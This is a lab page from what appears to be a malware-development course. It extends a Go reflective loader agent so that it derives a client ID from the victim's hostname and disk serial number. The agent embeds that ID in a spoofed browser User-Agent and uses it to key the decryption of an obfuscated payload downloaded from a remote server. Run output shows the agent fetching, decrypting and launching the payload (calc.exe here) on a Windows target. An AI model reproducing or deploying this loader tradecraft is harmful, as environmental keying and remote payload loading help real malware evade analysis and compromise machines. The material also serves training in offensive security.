---
showTableOfContents: true
title: "Implement Client ID and Key Derivation (Lab 8.2)"
type: "page"
---
## Goal
We'll now implement the final piece of the client-side logic for this module, and in fact the course as a whole: generating the client ID dynamically based on system information and integrating it fully into the communication and key derivation process.

So we'll only modify our agent/loader in this lab, and we'll pick up exactly where we left off over there. In that lab we hardcoded our clientID value as `MyTestClient-9876`, but now we want to generate it dynamically based on system characteristics (hostname and volume serial number). We'll then use this dynamically generated ID, along with the current timestamp, in both the User-Agent header sent to the server and in the client-side key derivation process to ensure it matches the key derived by the server.


## Code
Add the following function to the loader/agent application from Lab 8.1


```go
// Get system information for client identification
func getEnvironmentalID() (string, error) {
	// Get system volume information for environmental keying
	var volumeName [256]uint16 // Buffer for volume name (not used for ID)
	var volumeSerial uint32    // Variable to store the serial number

	// GetVolumeInformation for C: drive
	// We pass nil for pointers we don't need, except volumeSerial.
	err := windows.GetVolumeInformation(
		windows.StringToUTF16Ptr("C:\\"), // Target volume C:
		&volumeName[0],                   // Buffer for name (optional)
		uint32(len(volumeName)),          // Size of name buffer
		&volumeSerial,                    // Pointer to store serial number <<< IMPORTANT
		nil,                              // Pointer for max component length (optional)
		nil,                              // Pointer for file system flags (optional)
		nil,                              // Buffer for file system name (optional)
		0,                                // Size of file system name buffer
	)
	if err != nil {
		return "", fmt.Errorf("failed to get volume info: %w", err)
	}

	// Get hostname
	hostname, err := os.Hostname()
	if err != nil {
		return "", fmt.Errorf("failed to get hostname: %w", err)
	}

	// Combine information to create a unique but predictable client ID
	// Format: <first 5 chars of hostname>-<volume serial as hex>
	shortName := hostname
	if len(hostname) > 5 {
		shortName = hostname[:5] // Truncate hostname if longer than 5 chars
	}

	// Use Sprintf with %x verb to format the serial number as lowercase hex
	clientID := fmt.Sprintf("%s-%x", shortName, volumeSerial)
	fmt.Printf("[+] Generated Client ID: %s\n", clientID)

	return clientID, nil
}
```

And now we'll just need to make a small adjustment to `main()` to use this new function to derive the `clientID`.

Replace this line:
```go
clientID := "MyTestClient-9876"
```

With:
```go
fmt.Println("[+] Generating client ID from environment...")
clientID, err := getEnvironmentalID()
if err != nil {
    log.Fatalf("[-] Failed to generate client ID: %v", err)
}
```

## Code Breakdown
- The hardcoded placeholder `clientID` is removed.
- Instead, it's now being assigned the return value `getEnvironmentalID`
- This function combines the first 5 characters of the host name with the HD's serial number.
- The rest of the execution flow is the exact same, we are just now using this dynamically generated clientID value instead of the hardcoded value as we did before.


## Instructions
Run the exact same server from Lab 8.1 - this remains unchanged. You can once again either use `go build`, or from the directory containing the server, private key, cert, and `calc_dll.dll`simply run:

```
go run .
```

Then, compile the new loader+agent application, and copy it over to target system.

```shell
GOOS=windows GOARCH=amd64 go build  
```

Once on your target system simply invoke our new application.

## Results
```shell
PS C:\Users\vuilhond\Desktop> .\reflect_agent.exe
[+] Reflective Loader Agent (Network Download)
[+] Generating client ID from environment...
[+] Generated Client ID: DESKT-5c9150c8
[+] Downloading payload...
[+] Connecting to server: https://192.168.2.123:8443/update
[+] Using Timestamp: 1745685920
[+] Using ClientID: DESKT-5c9150c8
[+] Sending User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) rv:1745685920-DESKT-5c9150c8
[+] Downloaded 111493 bytes of obfuscated payload.
[+] Deriving decryption key...
    Using Timestamp for Key: 1745685920
    Using ClientID for Key: DESKT-5c9150c8
[+] Decrypting downloaded content...
[+] Decryption complete. Resulting size: 111493 bytes.

// REST OF OUTPUT IS THE SAME AS BEFORE

```

And of course we'll also see `calc.exe` pop up.

## Discussion
We can now see that we are dynamically generating a client ID (`Generated Client ID: DESKT-5c9150c8`), and that we are then using this value in our User-Agent (`[+] Sending User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) rv:1745685920-DESKT-5c9150c8`).

And of course the fact that we are able to once again launch `calc.exe` confirms that the agent correctly generated the client ID, sent it to the server, and used it (along with the correct timestamp) to derive the appropriate decryption key, matching the key derived by the server based on the received User-Agent. This completes the integration of the dynamic client identification with the key derivation process.

## Conclusion
That wraps it up it for this course, in the next section we'll review what we've done, as well as discuss the weakness of our current implementation, which we will then improve on in our next course :D


---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "cs_lab.md" >}})
